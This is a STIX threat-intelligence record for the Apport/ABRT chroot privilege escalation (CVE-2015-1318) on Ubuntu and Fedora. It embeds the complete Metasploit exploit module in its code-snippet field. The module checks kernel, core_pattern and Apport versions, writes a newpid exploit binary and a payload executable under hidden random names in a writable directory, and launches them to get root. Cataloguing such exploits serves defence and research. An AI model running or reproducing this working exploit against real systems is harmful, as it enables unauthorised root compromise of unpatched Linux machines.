{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--457eb2ff-1720-484f-b424-f2adcbff176e",
    "created": "2024-08-14T16:58:36.268861Z",
    "modified": "2024-08-14T16:58:36.268864Z",
    "name": "Apport / ABRT chroot Privilege Escalation",
    "description": " This module attempts to gain root privileges on Linux systems by invoking the default coredump handler inside a namespace (\"container\").  Apport versions 2.13 through 2.17.x before 2.17.1 on Ubuntu are vulnerable, due to a feature which allows forwarding reports to a container's Apport by changing the root directory before loading the crash report, causing `usr/share/apport/apport` within the crashed task's directory to be executed.  Similarly, Fedora is vulnerable when the kernel crash handler is configured to change root directory before executing ABRT, causing `usr/libexec/abrt-hook-ccpp` within the crashed task's directory to be executed.  In both instances, the crash handler does not drop privileges resulting in code execution as root.  This module has been tested successfully on Apport 2.14.1 on Ubuntu 14.04.1 LTS x86 and x86_64 and ABRT on Fedora 19 and 20 x86_64.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/apport_abrt_chroot_priv_esc.rb",
            "external_id": "apport_abrt_chroot_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1318"
        },
        {
            "source_name": "reference",
            "url": "http://www.openwall.com/lists/oss-security/2015/04/14/4"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/taviso/0f02c255c13c5c113406"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1211223"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1211835"
        },
        {
            "source_name": "reference",
            "url": "https://usn.ubuntu.com/usn/USN-2569-1/"
        },
        {
            "source_name": "reference",
            "url": "https://code.launchpad.net/~stgraber/apport/pidns-support/+merge/200893"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1438758"
        },
        {
            "source_name": "reference",
            "url": "http://bazaar.launchpad.net/~apport-hackers/apport/trunk/revision/2943"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apport / ABRT chroot Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on Linux systems by\n        invoking the default coredump handler inside a namespace (\"container\").\n\n        Apport versions 2.13 through 2.17.x before 2.17.1 on Ubuntu are\n        vulnerable, due to a feature which allows forwarding reports to\n        a container's Apport by changing the root directory before loading\n        the crash report, causing `usr/share/apport/apport` within the crashed\n        task's directory to be executed.\n\n        Similarly, Fedora is vulnerable when the kernel crash handler is\n        configured to change root directory before executing ABRT, causing\n        `usr/libexec/abrt-hook-ccpp` within the crashed task's directory to be\n        executed.\n\n        In both instances, the crash handler does not drop privileges,\n        resulting in code execution as root.\n\n        This module has been tested successfully on Apport 2.14.1 on\n        Ubuntu 14.04.1 LTS x86 and x86_64 and ABRT on Fedora 19 and 20 x86_64.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'St\u00e9phane Graber', # Independent discovery, PoC and patch\n          'Tavis Ormandy', # Independent discovery and C exploit\n          'Ricardo F. Teixeira', # shell exploit\n          'bcoles' # Metasploit\n        ],\n      'DisclosureDate' => '2015-03-31',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'References'     =>\n        [\n          [ 'CVE', '2015-1318' ],\n          [ 'URL', 'http://www.openwall.com/lists/oss-security/2015/04/14/4' ],\n          # Exploits\n          [ 'EDB', '36782' ],\n          [ 'EDB', '36746' ],\n          [ 'URL', 'https://gist.github.com/taviso/0f02c255c13c5c113406' ],\n          # ABRT (Fedora)\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1211223' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1211835' ],\n          # Apport (Ubuntu)\n          [ 'URL', 'https://usn.ubuntu.com/usn/USN-2569-1/' ],\n          [ 'URL', 'https://code.launchpad.net/~stgraber/apport/pidns-support/+merge/200893' ],\n          [ 'URL', 'https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1438758' ],\n          [ 'URL', 'http://bazaar.launchpad.net/~apport-hackers/apport/trunk/revision/2943' ]\n        ]\n    ))\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def check\n    unless userns_enabled?\n      vprint_error 'Unprivileged user namespaces are not permitted'\n      return CheckCode::Safe\n    end\n    vprint_good 'Unprivileged user namespaces are permitted'\n\n    kernel_version = Rex::Version.new kernel_release.split('-').first\n\n    if kernel_version < Rex::Version.new('3.12')\n      vprint_error \"Linux kernel version #{kernel_version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Linux kernel version #{kernel_version} is vulnerable\"\n\n    kernel_core_pattern = read_file('/proc/sys/kernel/core_pattern').to_s\n\n    # Vulnerable core_pattern (abrt):\n    #   kernel.core_pattern = |/usr/sbin/chroot /proc/%P/root /usr/libexec/abrt-hook-ccpp %s %c %p %u %g %t e\n    # Patched systems no longer preface the command with /usr/sbin/chroot\n    #   kernel.core_pattern = |/usr/libexec/abrt-hook-ccpp %s %c %p %u %g %t e\n    if kernel_core_pattern.include?('chroot') && kernel_core_pattern.include?('abrt-hook-ccpp')\n      vprint_good 'System is configured to chroot ABRT for crash reporting'\n      return CheckCode::Appears\n    end\n\n    # Vulnerable core_pattern (apport):\n    #   kernel.core_pattern = |/usr/share/apport/apport %p %s %c %P\n    if kernel_core_pattern.include? 'apport'\n      vprint_good 'System is configured to use Apport for crash reporting'\n\n      unless command_exists?('apport-cli')\n        return CheckCode::Detected('Could not determine Apport version. apport-cli is not installed or not in $PATH.')\n      end\n\n      res = cmd_exec('apport-cli --version').to_s\n\n      if res.blank?\n        return CheckCode::Detected('Could not determine Apport version')\n      end\n\n      apport_version = Rex::Version.new(res.split('-').first)\n\n      # apport 2.13 < 2.17.1\n      if apport_version.between?(Rex::Version.new('2.13'), Rex::Version.new('2.17'))\n        vprint_good \"Apport version #{apport_version} is vulnerable\"\n        return CheckCode::Appears\n      end\n\n      vprint_error \"Apport version #{apport_version} is not vulnerable\"\n\n      return CheckCode::Safe\n    end\n\n    vprint_error 'System is not configured to use Apport or chroot ABRT for crash reporting'\n\n    CheckCode::Safe\n  end\n\n  def upload_and_chmodx(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    chmod path\n    register_file_for_cleanup path\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    # Upload Tavis Ormandy's newpid exploit:\n    # - https://www.exploit-db.com/exploits/36746/\n    # Cross-compiled with:\n    # - i486-linux-musl-cc -static newpid.c\n    executable_data = ::File.binread ::File.join Msf::Config.data_directory, 'exploits', 'cve-2015-1318', 'newpid'\n\n    executable_name = \".#{rand_text_alphanumeric 5..10}\"\n    executable_path = \"#{base_dir}/#{executable_name}\"\n    upload_and_chmodx executable_path, executable_data\n\n    # Upload payload executable\n    payload_name = \".#{rand_text_alphanumeric 5..10}\"\n    payload_path = \"#{base_dir}/#{payload_name}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    # newpid writes an 'exploit' directory\n    # which must be removed manually if exploitation fails\n    register_dir_for_cleanup \"#{base_dir}/exploit\"\n\n    # Change working directory to base_dir,\n    # allowing newpid to create the required hard links\n    print_status 'Launching exploit...'\n    output = cmd_exec \"cd #{base_dir}; echo '#{payload_path}&' | #{executable_path}\"\n    output.each_line { |line| vprint_status line.chomp }\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-31",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}